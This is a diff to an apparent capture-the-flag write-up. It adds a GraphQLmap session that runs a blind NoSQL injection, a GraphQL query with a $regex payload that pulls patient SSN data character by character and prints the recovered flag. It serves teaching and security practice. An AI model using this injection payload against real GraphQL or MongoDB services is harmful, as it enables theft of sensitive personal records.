@@ -169,3 +169,16 @@ The injection worked, now we can re-use the payload from the challenge #2 and ex
 {% endhighlight %}
 
 Obviously we scripted the data extraction in Python, the script below will get the last flag : `4f537c0a-7da6-4acc-81e1-8c33c02ef3b`.
+
+At that time we were checking if the content of `r.json()['data']['doctors']` was not empty, in order to abstract the data extraction we now take a check input from the user in order to compare the output.
+
+
+{% highlight json %}
+GraphQLmap > nosqli
+Query > {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
+Check > 5d089c51dcab2d0032fdd08d
+[+] Data found: 4f537c0a-7da6-4acc-81e1-8c33c02ef3b
+{% endhighlight %}
+
+I hope you enjoyed the challenges as I did !     
+Feel free to share the blog post ! :)
